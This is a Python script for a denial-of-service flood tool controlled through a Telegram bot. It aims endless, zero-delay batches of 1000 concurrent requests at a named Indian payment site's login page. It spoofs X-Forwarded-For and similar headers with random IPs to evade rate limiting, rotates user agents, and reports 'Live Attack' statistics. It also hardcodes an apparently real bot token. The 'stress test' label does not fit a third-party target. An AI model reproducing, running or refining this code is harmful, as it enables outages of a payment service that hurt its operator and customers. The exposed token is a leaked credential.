import asyncio
import aiohttp
import random
from telebot.async_telebot import AsyncTeleBot

# ==========================================
# CONFIGURATION
# ==========================================
BOT_TOKEN = "8607797493:AAFjRgGRpHRmKoQBBoWzCP7TQxa2QqncZC8"  
TARGET_URL = "https://www.elitepay.co.in/login"
DOMAIN = "www.elitepay.co.in"

bot = AsyncTeleBot(BOT_TOKEN)

# Global stats tracking
stats = {
    "total_sent": 0,
    "success_200": 0,
    "rate_limited_429": 0,
    "other_errors": 0,
    "last_status": "Starting...",
    "last_preview": "None"
}

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 14; CPH2681) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.8010.36 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
]

def generate_fake_ip():
    return f"{random.randint(1, 220)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

# Single Request Worker with Fake IP Spoofing
async def fire_request(session):
    global stats
    fake_ip = generate_fake_ip()
    headers = {
        "Host": DOMAIN,
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Referer": f"https://{DOMAIN}/",
        "Accept-Language": "en-US,en;q=0.9",
        "X-Forwarded-For": fake_ip,
        "X-Real-IP": fake_ip,
        "Client-IP": fake_ip,
        "True-Client-IP": fake_ip,
    }
    try:
        timeout = aiohttp.ClientTimeout(total=30, connect=10, sock_read=20)
        async with session.get(TARGET_URL, headers=headers, timeout=timeout) as response:
            text = await response.text()
            stats["total_sent"] += 1
            stats["last_status"] = str(response.status)
            stats["last_preview"] = (text[:60] + '..') if len(text) > 60 else text.strip()

            if response.status == 200:
                stats["success_200"] += 1
            elif response.status == 429:
                stats["rate_limited_429"] += 1
            else:
                stats["other_errors"] += 1
    except Exception as e:
        stats["total_sent"] += 1
        stats["other_errors"] += 1
        stats["last_status"] = "ERR"
        stats["last_preview"] = str(e)[:40]

# High-Speed Infinite Loop (Zero Sleep) with 1000 Concurrency
async def continuous_flood_worker():
    batch_size = 1000  # Ek sath 1000 requests parallel fire hongi
    connector = aiohttp.TCPConnector(limit=3000, limit_per_host=3000)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            tasks = [fire_request(session) for _ in range(batch_size)]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.001)

# /start Command
@bot.message_handler(commands=['start'])
async def handle_start(message):
    welcome_text = (
        "⚡ **ElitePay Stress Test Bot Running (1000 Concurrency)**\n\n"
        "Commands:\n"
        "➔ `/status` - Live request count aur response check karne ke liye."
    )
    await bot.reply_to(message, welcome_text, parse_mode='Markdown')

# /status Command
@bot.message_handler(commands=['status'])
async def handle_status(message):
    status_text = (
        "📊 **Live Attack / Stress Stats**\n\n"
        f"🎯 **Target:** `elitepay.co.in/login`\n"
        f"🚀 **Total Hits Sent:** `{stats['total_sent']}`\n"
        f"✅ **Success (200):** `{stats['success_200']}`\n"
        f"🚫 **Rate-Limited (429):** `{stats['rate_limited_429']}`\n"
        f"⚠️ **Errors/Other:** `{stats['other_errors']}`\n\n"
        f"📡 **Last Status:** `{stats['last_status']}`\n"
        f"📝 **Latest Response:** `{stats['last_preview']}`"
    )
    await bot.reply_to(message, status_text, parse_mode='Markdown')

async def main():
    print("Zero-Delay Continuous Loop (1000 Concurrency) Started on Railway...")
    asyncio.create_task(continuous_flood_worker())
    await bot.polling(non_stop=True)

if __name__ == "__main__":
    asyncio.run(main())
    
